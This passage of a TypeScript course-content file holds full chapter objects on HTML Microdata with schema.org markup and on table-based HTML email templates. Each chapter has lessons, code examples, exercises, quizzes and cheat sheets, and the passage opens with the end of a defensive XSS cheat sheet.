        difficulty: 2,
      },
    ],
  },
  cheatSheet: [
    { label: "XSS", value: "Cross-Site Scripting attack" },
    { label: "textContent", value: "Safe text assignment" },
    { label: "CSP", value: "Content Security Policy" },
    { label: "script-src", value: "Control script sources" },
    { label: "HttpOnly", value: "Protect cookies from JS" },
    { label: "Validate input", value: "Never trust user input" },
  ],
};

// ============================================================================
// HTML CHAPTER 39 — MICRODATA
// ============================================================================
export const htmlCh39: Chapter = {
  id: "html-ch-39",
  number: 39,
  title: "Microdata",
  subtitle: "Itemprop, itemscope, itemtype.",
  difficulty: "Advanced",
  estimatedMinutes: 30,
  xpReward: 100,
  prerequisites: ["html-ch-38"],
  partLabel: "Part 6: Advanced HTML",
  learningObjectives: [
    "Understand what Microdata is and its purpose.",
    "Use itemscope to define item boundaries.",
    "Use itemtype to specify vocabulary.",
    "Use itemprop to add properties.",
    "Implement structured data for search engines.",
  ],
  sections: [
    {
      id: "ch39-s1",
      title: "Introduction to Microdata",
      whyItMatters: "Microdata helps search engines understand your content better. This can lead to rich search results (rich snippets) that improve click-through rates and visibility.",
      realWorldAnalogy: "Microdata is like adding labels to items in a store. Without labels, items are just objects. With labels, everyone knows exactly what each item is—its price, brand, size, etc. Search engines are the shoppers who need these labels.",
      content: `**What is Microdata?**
Microdata is an HTML specification for embedding machine-readable data in HTML documents. It uses attributes to add structured data that search engines and other tools can understand.

**Key attributes:**
- **itemscope**: Creates an item (defines scope)
- **itemtype**: Specifies the vocabulary (schema.org)
- **itemid**: Unique identifier for the item
- **itemprop**: Adds a property to an item
- **itemref**: References properties elsewhere

**Basic structure:**
\`\`\`
<div itemscope itemtype="https://schema.org/Person">
  <span itemprop="name">John Doe</span>
  <span itemprop="email">john@example.com</span>
</div>
\`\`\`

**Schema.org vocabulary:**
Schema.org provides a standard vocabulary for structured data. It includes types for:
- People, Organizations, Places
- Products, Offers, Reviews
- Events, Articles, Recipes
- And many more

**Why use Microdata?**
- **Rich snippets**: Enhanced search results
- **Better SEO**: Search engines understand content better
- **Voice search**: Helps voice assistants
- **Knowledge graphs**: Contributes to Google's knowledge graph
- **Accessibility**: Can improve screen reader experience

**Microdata vs JSON-LD:**
- Microdata: Embedded in HTML
- JSON-LD: Separate script block
- Both use Schema.org vocabulary
- JSON-LD is often preferred for maintenance`,
      codeExamples: [
        {
          id: "ch39-s1-ex1",
          title: "Person microdata",
          description: "Adding structured data for a person profile.",
          code: {
            html: `<div itemscope itemtype="https://schema.org/Person">
  <h1 itemprop="name">Jane Smith</h1>
  <p>
    Job Title: <span itemprop="jobTitle">Software Engineer</span>
  </p>
  <p>
    Email: <a href="mailto:jane@example.com" itemprop="email">jane@example.com</a>
  </p>
  <p>
    Works at: <span itemprop="worksFor" itemscope itemtype="https://schema.org/Organization">
      <span itemprop="name">Tech Company Inc.</span>
    </span>
  </p>
  <img src="jane.jpg" alt="Jane Smith" itemprop="image">
</div>`,
          },
          explanation: "Person item with properties like name, jobTitle, email, and worksFor. The worksFor property is a nested Organization item with its own name property. Image is specified with itemprop.",
          tryItPrompt: "Use Google's Structured Data Testing Tool to validate this microdata and see how search engines interpret it.",
        },
      ],
      callouts: [
        { type: "tip", title: "Use Schema.org", content: "Always use Schema.org vocabularies for itemtype. It's the standard supported by Google, Bing, Yahoo, and Yandex. Visit schema.org to explore available types and properties.",
        },
        { type: "common-mistake", title: "Missing itemscope", content: "Don't forget itemscope when using itemtype. itemtype alone doesn't create an item—you need itemscope to define the item boundary. Always use them together.",
        },
      ],
    },
    {
      id: "ch39-s2",
      title: "Common Microdata Patterns",
      whyItMatters: "Understanding common patterns helps you implement structured data effectively for different content types like products, articles, events, and reviews.",
      content: `**Product microdata:**
\`\`\`
<div itemscope itemtype="https://schema.org/Product">
  <h1 itemprop="name">Widget</h1>
  <img itemprop="image" src="widget.jpg" alt="Widget">
  <span itemprop="description">A useful widget</span>
  <span itemprop="offers" itemscope itemtype="https://schema.org/Offer">
    <span itemprop="price" content="29.99">$29.99</span>
    <span itemprop="priceCurrency" content="USD">USD</span>
    <link itemprop="availability" href="https://schema.org/InStock">
  </span>
</div>
\`\`\`

**Article microdata:**
\`\`\`
<article itemscope itemtype="https://schema.org/Article">
  <h1 itemprop="headline">Article Title</h1>
  <time itemprop="datePublished" datetime="2024-01-15">Jan 15, 2024</time>
  <span itemprop="author" itemscope itemtype="https://schema.org/Person">
    <span itemprop="name">Author Name</span>
  </span>
  <div itemprop="articleBody">Article content...</div>
</article>
\`\`\`

**Review microdata:**
\`\`\`
<div itemscope itemtype="https://schema.org/Review">
  <span itemprop="itemReviewed" itemscope itemtype="https://schema.org/Product">
    <span itemprop="name">Product Name</span>
  </span>
  <span itemprop="reviewRating" itemscope itemtype="https://schema.org/Rating">
    <span itemprop="ratingValue">4.5</span>
    <span itemprop="bestRating">5</span>
  </span>
  <span itemprop="author" itemscope itemtype="https://schema.org/Person">
    <span itemprop="name">Reviewer</span>
  </span>
  <p itemprop="reviewBody">Great product!</p>
</div>
\`\`\`

**Testing microdata:**
Use Google's Rich Results Test or Structured Data Testing Tool to validate your microdata.`,
      codeExamples: [
        {
          id: "ch39-s2-ex1",
          title: "Product with offers",
          description: "Complete product microdata with pricing and availability.",
          code: {
            html: `<div itemscope itemtype="https://schema.org/Product">
  <h1 itemprop="name">Wireless Headphones</h1>
  <img itemprop="image" src="headphones.jpg" alt="Wireless Headphones">
  <p itemprop="description">High-quality wireless headphones with noise cancellation.</p>
  
  <div itemprop="aggregateRating" itemscope itemtype="https://schema.org/AggregateRating">
    Rating: <span itemprop="ratingValue">4.7</span> out of 
    <span itemprop="bestRating">5</span>
    (<span itemprop="reviewCount">128</span> reviews)
  </div>
  
  <div itemprop="offers" itemscope itemtype="https://schema.org/Offer">
    <span itemprop="price" content="199.99">$199.99</span>
    <span itemprop="priceCurrency" content="USD">USD</span>
    <meta itemprop="availability" content="https://schema.org/InStock">
    <link itemprop="url" href="https://example.com/headphones">
  </div>
  
  <div itemprop="brand" itemscope itemtype="https://schema.org/Brand">
    <span itemprop="name">AudioBrand</span>
  </div>
  
  <div itemprop="sku" content="WH-001">SKU: WH-001</div>
</div>`,
          },
          explanation: "Product with name, image, description, aggregate rating, and offer details. Offer includes price, currency, availability, and URL. Brand and SKU also specified. This comprehensive microdata enables rich product snippets in search results.",
          tryItPrompt: "Validate this with Google's Rich Results Test. You should see product type detected with all properties recognized.",
        },
      ],
      callouts: [
        { type: "info", title: "Required properties", content: "Each Schema.org type has required and recommended properties. Check Schema.org documentation for what's required for each type you use. Missing required properties may prevent rich results.",
        },
        { type: "common-mistake", title: "Wrong itemtype URL", content: "Always use the full https://schema.org/ URL for itemtype. Don't use relative URLs or abbreviated forms. The full URL ensures compatibility across all search engines.",
        },
      ],
    },
  ],
  exercises: [
    {
      id: "ch39-ex1",
      title: "Add microdata to a recipe",
      difficulty: 1,
      description: "Add structured data to a recipe using Microdata.",
      requirements: ["Use Recipe itemtype from Schema.org", "Add name, description, and image", "Include recipe instructions", "Add cooking time and prep time", "Include ingredients list"],
      starterCode: {
        html: `<div>
  <h1>Chocolate Chip Cookies</h1>
  <img src="cookies.jpg" alt="Chocolate Chip Cookies">
  <p>Delicious homemade chocolate chip cookies.</p>
  <p>Prep time: 15 minutes</p>
  <p>Cook time: 10 minutes</p>
  
  <h2>Ingredients</h2>
  <ul>
    <li>2 cups flour</li>
    <li>1 cup sugar</li>
    <li>1/2 cup chocolate chips</li>
  </ul>
  
  <h2>Instructions</h2>
  <ol>
    <li>Mix dry ingredients</li>
    <li>Add wet ingredients</li>
    <li>Bake at 350°F</li>
  </ol>
</div>`,
      },
      hints: [
        "Add itemscope and itemtype to the container",
        "Use itemprop for name, description, image",
        "Use PT (time) format for durations (e.g., PT15M)",
        "Add RecipeInstruction type for steps",
        "Use Ingredient type for ingredients",
      ],
      solution: {
        html: `<div itemscope itemtype="https://schema.org/Recipe">
  <h1 itemprop="name">Chocolate Chip Cookies</h1>
  <img itemprop="image" src="cookies.jpg" alt="Chocolate Chip Cookies">
  <p itemprop="description">Delicious homemade chocolate chip cookies.</p>
  <p>Prep time: <time itemprop="prepTime" datetime="PT15M">15 minutes</time></p>
  <p>Cook time: <time itemprop="cookTime" datetime="PT10M">10 minutes</time></p>
  <p>Total time: <time itemprop="totalTime" datetime="PT25M">25 minutes</time></p>
  
  <h2>Ingredients</h2>
  <ul>
    <li itemprop="recipeIngredient">2 cups flour</li>
    <li itemprop="recipeIngredient">1 cup sugar</li>
    <li itemprop="recipeIngredient">1/2 cup chocolate chips</li>
  </ul>
  
  <h2>Instructions</h2>
  <ol>
    <li itemprop="recipeInstructions">Mix dry ingredients</li>
    <li itemprop="recipeInstructions">Add wet ingredients</li>
    <li itemprop="recipeInstructions">Bake at 350°F</li>
  </ol>
</div>`,
      },
      solutionExplanation: "Added Recipe itemtype with itemscope. Used itemprop for name, image, description. Time elements with datetime in ISO 8601 duration format (PT15M = 15 minutes). Ingredients marked with recipeIngredient. Steps marked with recipeInstructions. This enables rich recipe snippets in search results.",
    },
  ],
  quiz: {
    passingScore: 80,
    questions: [
      {
        id: "ch39-q1",
        type: "mcq",
        question: "What attribute creates an item boundary in Microdata?",
        options: ["itemtype", "itemprop", "itemscope", "itemid"],
        correctAnswer: 2,
        explanation: "itemscope creates an item and defines its scope. It tells the browser that the element and its children contain structured data about an item.",
        difficulty: 1,
      },
      {
        id: "ch39-q2",
        type: "mcq",
        question: "What attribute specifies the vocabulary in Microdata?",
        options: ["itemscope", "itemtype", "itemprop", "itemref"],
        correctAnswer: 1,
        explanation: "itemtype specifies the vocabulary using a URL, typically from Schema.org. It tells search engines what type of item the data represents (e.g., Person, Product, Recipe).",
        difficulty: 1,
      },
      {
        id: "ch39-q3",
        type: "true-false",
        question: "Microdata uses JSON-LD syntax.",
        options: ["True", "False"],
        correctAnswer: 1,
        explanation: "False. Microdata uses HTML attributes (itemscope, itemtype, itemprop) embedded directly in HTML. JSON-LD is a different format that uses a script block with JSON data.",
        difficulty: 1,
      },
      {
        id: "ch39-q4",
        type: "mcq",
        question: "What vocabulary is commonly used with Microdata?",
        options: ["Open Graph", "Schema.org", "Twitter Cards", "Dublin Core"],
        correctAnswer: 1,
        explanation: "Schema.org is the standard vocabulary used with Microdata. It's supported by major search engines and provides types for people, products, events, and more.",
        difficulty: 1,
      },
      {
        id: "ch39-q5",
        type: "mcq",
        question: "What benefit does Microdata provide?",
        options: [
          "Faster page load times",
          "Rich search results (rich snippets)",
          "Automatic CSS styling",
          "Database storage",
        ],
        correctAnswer: 1,
        explanation: "Microdata enables rich search results (rich snippets) by helping search engines understand your content. This can improve click-through rates and visibility in search results.",
        difficulty: 2,
      },
    ],
  },
  cheatSheet: [
    { label: "itemscope", value: "Creates item boundary" },
    { label: "itemtype", value: "Specifies Schema.org type" },
    { label: "itemprop", value: "Adds property" },
    { label: "Schema.org", value: "Standard vocabulary" },
    { label: "Rich snippets", value: "Enhanced search results" },
    { label: "Nested items", value: "Items within items" },
  ],
};

// ============================================================================
// HTML CHAPTER 40 — HTML EMAIL BASICS
// ============================================================================
export const htmlCh40: Chapter = {
  id: "html-ch-40",
  number: 40,
  title: "HTML Email Basics",
  subtitle: "Why HTML email is its own world.",
  difficulty: "Advanced",
  estimatedMinutes: 35,
  xpReward: 110,
  prerequisites: ["html-ch-39"],
  partLabel: "Part 6: Advanced HTML",
  learningObjectives: [
    "Understand why HTML email is different from web HTML.",
    "Use tables for layout in email clients.",
    "Implement inline CSS for email compatibility.",
    "Use email-safe HTML elements and attributes.",
    "Test emails across different clients.",
  ],
  sections: [
    {
      id: "ch40-s1",
      title: "The Challenge of HTML Email",
      whyItMatters: "HTML email requires different techniques than web development because email clients have limited and inconsistent support for modern HTML and CSS. Understanding these limitations is crucial for creating emails that work everywhere.",
      realWorldAnalogy: "HTML email is like sending a letter to 20 different countries, each with different rules about what you can write. You need to write in a way that's understood by all of them, even if it means using older, more universal methods.",
      content: `**Why HTML email is different:**
Email clients vary wildly in their rendering capabilities. What works in Gmail may not work in Outlook, and vice versa. This requires a different approach to HTML and CSS.

**Major email clients:**
- **Gmail**: Good CSS support, strips some styles
- **Outlook**: Uses Word rendering engine, limited CSS
- **Apple Mail**: Good support, Safari-like
- **Thunderbird**: Good support, Firefox-like
- **Mobile clients**: Varying support levels

**Key limitations:**
- **No JavaScript**: Scripts are stripped for security
- **Limited CSS**: Modern features often unsupported
- **Inconsistent support**: Different clients support different features
- **Blocking**: Some clients block external resources
- **Images off by default**: Users must enable images

**CSS in email:**
- **Inline styles**: Most reliable method
- **Embedded styles**: Work in some clients
- **External stylesheets**: Often blocked
- **CSS reset**: Helpful for consistency

**Layout techniques:**
- **Tables**: Primary layout method
- **Nested tables**: For complex layouts
- **Spacer GIFs**: For precise spacing
- **Conditional code**: For client-specific fixes`,
      codeExamples: [
        {
          id: "ch40-s1-ex1",
          title: "Basic email template structure",
          description: "A simple but effective email template using tables.",
          code: {
            html: `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Email Template</title>
    <style>
        /* Client-specific styles */
        .ReadMsgBody { width: 100%; background-color: #f4f4f4; }
        .ExternalClass { width: 100%; background-color: #f4f4f4; }
        
        /* Mobile styles */
        @media only screen and (max-width: 600px) {
            .container { width: 100% !important; }
            .mobile-padding { padding-left: 20px !important; padding-right: 20px !important; }
        }
    </style>
</head>
<body style="margin: 0; padding: 0; background-color: #f4f4f4;">
    <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%" style="background-color: #f4f4f4;">
        <tr>
            <td style="padding: 20px;">
                <!-- Main container -->
                <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="600" style="margin: 0 auto; background-color: #ffffff;" class="container">
                    <tr>
                        <td style="padding: 30px; text-align: center;">
                            <h1 style="margin: 0; color: #333333; font-family: Arial, sans-serif;">Welcome!</h1>
                            <p style="margin: 20px 0 0; color: #666666; font-family: Arial, sans-serif;">
                                Thanks for signing up.
                            </p>
                            <a href="#" style="display: inline-block; padding: 12px 24px; background-color: #007bff; color: #ffffff; text-decoration: none; border-radius: 4px; font-family: Arial, sans-serif;">Get Started</a>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>`,
          },
          explanation: "Uses table-based layout for maximum compatibility. Inline styles on elements for reliability. Client-specific styles for Gmail and Outlook. Media query for mobile responsiveness. Centered container with fixed width (600px is standard for emails).",
          tryItPrompt: "Test this template in different email clients using a service like Litmus or Email on Acid. Notice how it renders consistently across clients.",
        },
      ],
      callouts: [
        { type: "warning", title: "No JavaScript in emails", content: "Never use JavaScript in HTML emails. Email clients strip all scripts for security reasons. This means no tracking scripts, no dynamic behavior, no form validation without server-side processing.",
        },
        { type: "tip", title: "Use role='presentation'", content: "Add role='presentation' to layout tables to help screen readers understand they're for layout, not data. This improves accessibility of your HTML emails.",
        },
      ],
    },
    {
      id: "ch40-s2",
      title: "Best Practices for Email HTML",
      whyItMatters: "Following email HTML best practices ensures your emails render correctly across all major email clients and devices, providing a consistent experience for all recipients.",
      content: `**Use tables for layout:**
\`\`\`
<table role="presentation" cellspacing="0" cellpadding="0" border="0">
    <tr>
        <td>Content here</td>
    </tr>
</table>
\`\`\`

**Inline CSS:**
\`\`\`
<td style="color: #333; font-size: 16px; padding: 10px;">
\`\`\`
Use inline styles for maximum compatibility.

**Email-safe CSS properties:**
- color, font-size, font-family
- background-color, background-image
- padding, margin (sometimes)
- border, border-radius (limited)
- text-align
- width, height

**Avoid in email:**
- Position: absolute/fixed
- Float (use tables instead)
- Flexbox/Grid (use tables)
- :hover/:active states
- CSS animations
- Background-size (limited)

**Images in email:**
- Use absolute URLs
- Include alt text
- Set dimensions
- Add display: block
- Consider fallback colors

**Responsive email:**
\`\`\`
@media only screen and (max-width: 600px) {
    .mobile-width { width: 100% !important; }
}
\`\`\`

**Conditional code for Outlook:**
\`\`\`
<!--[if mso]>
    <table>
        <tr>
            <td>Outlook-specific content</td>
        </tr>
    </table>
<![endif]-->
\`\`\``,
      codeExamples: [
        {
          id: "ch40-s2-ex1",
          title: "Two-column email layout",
          description: "Creating a responsive two-column layout using tables.",
          code: {
            html: `<!DOCTYPE html>
<html>
<body style="margin: 0; padding: 0; background-color: #f4f4f4;">
    <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%" style="background-color: #f4f4f4;">
        <tr>
            <td style="padding: 20px;">
                <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="600" style="margin: 0 auto; background-color: #ffffff;" class="container">
                    <!-- Header -->
                    <tr>
                        <td style="padding: 30px; text-align: center; background-color: #007bff;">
                            <h1 style="margin: 0; color: #ffffff; font-family: Arial, sans-serif;">Newsletter</h1>
                        </td>
                    </tr>
                    
                    <!-- Two columns -->
                    <tr>
                        <td style="padding: 0;">
                            <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%">
                                <tr>
                                    <!-- Column 1 -->
                                    <td width="50%" style="vertical-align: top; padding: 20px;" class="column">
                                        <h2 style="margin: 0 0 10px; color: #333333; font-family: Arial, sans-serif;">Feature 1</h2>
                                        <p style="margin: 0; color: #666666; font-family: Arial, sans-serif; line-height: 1.6;">
                                            Description of the first feature goes here with compelling copy.
                                        </p>
                                    </td>
                                    <!-- Column 2 -->
                                    <td width="50%" style="vertical-align: top; padding: 20px;" class="column">
                                        <h2 style="margin: 0 0 10px; color: #333333; font-family: Arial, sans-serif;">Feature 2</h2>
                                        <p style="margin: 0; color: #666666; font-family: Arial, sans-serif; line-height: 1.6;">
                                            Description of the second feature goes here with compelling copy.
                                        </p>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    
                    <!-- Footer -->
                    <tr>
                        <td style="padding: 20px; text-align: center; background-color: #f4f4f4;">
                            <p style="margin: 0; color: #666666; font-family: Arial, sans-serif; font-size: 12px;">
                                © 2024 Company Name
                            </p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
    
    <style>
        @media only screen and (max-width: 600px) {
            .container { width: 100% !important; }
            .column { display: block !important; width: 100% !important; }
        }
    </style>
</body>
</html>`,
          },
          explanation: "Two-column layout using nested tables. Each column is a table cell with 50% width. Mobile media query stacks columns vertically on small screens. Header and footer with background colors. All styles inline for compatibility.",
          tryItPrompt: "Resize your browser window to see the responsive behavior. On mobile, the columns stack vertically. Test in actual email clients for verification.",
        },
      ],
      callouts: [
        { type: "info", title: "600px standard width", content: "Keep email width at 600px or less. This fits in most email client preview panes and mobile screens. Some use 640px, but 600px is the safe standard.",
        },
        { type: "common-mistake", title: "Using modern CSS", content: "Don't use Flexbox, Grid, or modern CSS in emails. Email clients don't support them. Stick to table-based layouts and inline styles for maximum compatibility.",
        },
      ],
    },
  ],
  exercises: [
    {
      id: "ch40-ex1",
      title: "Create a promotional email template",
      difficulty: 1,
      description: "Create a responsive promotional email template using tables.",
      requirements: ["Use table-based layout", "Include inline CSS styles", "Add header with logo/title", "Create single-column content area", "Include call-to-action button", "Add mobile responsiveness"],
      starterCode: {
        html: `<!-- Create your email template here -->`,
      },
      hints: [
        "Use role='presentation' on layout tables",
        "Set width to 600px on main container",
        "Use inline styles for all elements",
        "Add media query for mobile responsiveness",
        "Test with images off (use background colors)",
      ],
      solution: {
        html: `<!DOCTYPE html>
<html>
<body style="margin: 0; padding: 0; background-color: #f4f4f4;">
    <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%" style="background-color: #f4f4f4;">
        <tr>
            <td style="padding: 20px;">
                <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="600" style="margin: 0 auto; background-color: #ffffff;" class="container">
                    <!-- Header -->
                    <tr>
                        <td style="padding: 30px; text-align: center; border-bottom: 2px solid #007bff;">
                            <h1 style="margin: 0; color: #007bff; font-family: Arial, sans-serif; font-size: 28px;">Special Offer!</h1>
                        </td>
                    </tr>
                    
                    <!-- Content -->
                    <tr>
                        <td style="padding: 30px; text-align: center;">
                            <h2 style="margin: 0 0 15px; color: #333333; font-family: Arial, sans-serif;">50% Off Everything</h2>
                            <p style="margin: 0 0 25px; color: #666666; font-family: Arial, sans-serif; line-height: 1.6;">
                                Don't miss out on our biggest sale of the year. Limited time only!
                            </p>
                            <table role="presentation" cellspacing="0" cellpadding="0" border="0" style="margin: 0 auto;">
                                <tr>
                                    <td style="background-color: #007bff; border-radius: 4px;">
                                        <a href="#" style="display: block; padding: 15px 30px; color: #ffffff; text-decoration: none; font-family: Arial, sans-serif; font-weight: bold;">Shop Now</a>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    
                    <!-- Footer -->
                    <tr>
                        <td style="padding: 20px; text-align: center; background-color: #f4f4f4; border-top: 1px solid #ddd;">
                            <p style="margin: 0; color: #666666; font-family: Arial, sans-serif; font-size: 12px;">
                                © 2024 Store Name. All rights reserved.
                            </p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
    
    <style>
        @media only screen and (max-width: 600px) {
            .container { width: 100% !important; }
        }
    </style>
</body>
</html>`,
      },
      solutionExplanation: "Created table-based email template with 600px width container. Header with brand color and title. Content area with promotional text and CTA button (using table for rounded corners). Footer with copyright. Mobile media query makes container 100% width on small screens. All styles inline for email client compatibility.",
    },
  ],
  quiz: {
    passingScore: 80,
    questions: [
      {
        id: "ch40-q1",
        type: "mcq",
        question: "What is the recommended maximum width for HTML emails?",
        options: ["300px", "600px", "1200px", "No limit"],
        correctAnswer: 1,
        explanation: "600px is the standard recommended width for HTML emails. This fits in most email client preview panes and mobile screens. Some use 640px, but 600px is the safe standard.",
        difficulty: 1,
      },
      {
        id: "ch40-q2",
        type: "mcq",
        question: "What layout method is most reliable for HTML emails?",
        options: ["Flexbox", "Grid", "Tables", "CSS Grid"],
        correctAnswer: 2,
        explanation: "Tables are the most reliable layout method for HTML emails. Modern CSS like Flexbox and Grid is not supported by many email clients, especially Outlook.",
        difficulty: 1,
      },
      {
        id: "ch40-q3",
        type: "true-false",
        question: "JavaScript can be used in HTML emails.",
        options: ["True", "False"],
        correctAnswer: 1,
        explanation: "False. JavaScript is stripped from HTML emails by all email clients for security reasons. You must rely on server-side processing and avoid any client-side scripting.",
        difficulty: 1,
      },
      {
        id: "ch40-q4",
        type: "mcq",
        question: "Where should CSS be placed for maximum email compatibility?",
        options: ["External stylesheet", "Embedded in head", "Inline on elements", "All of the above equally"],
        correctAnswer: 2,
        explanation: "Inline CSS on elements provides the maximum compatibility across email clients. External stylesheets are often blocked, and embedded styles have inconsistent support.",
        difficulty: 1,
      },
      {
        id: "ch40-q5",
        type: "mcq",
        question: "Why is HTML email development challenging?",
        options: [
          "Emails are too small",
          "Email clients have inconsistent rendering support",
          "No one reads emails anymore",
          "Emails don't support HTML",
        ],
        correctAnswer: 1,
        explanation: "Email clients have inconsistent and limited support for HTML and CSS. What works in Gmail may not work in Outlook, requiring different techniques than web development.",
        difficulty: 2,
      },
    ],
  },
  cheatSheet: [
    { label: "Max width", value: "600px" },
    { label: "Layout", value: "Use tables" },
    { label: "CSS", value: "Inline styles" },
    { label: "No JS", value: "JavaScript blocked" },
    { label: "role='presentation'", value: "For layout tables" },
    { label: "Test everywhere", value: "Multiple clients" },
  ],
};
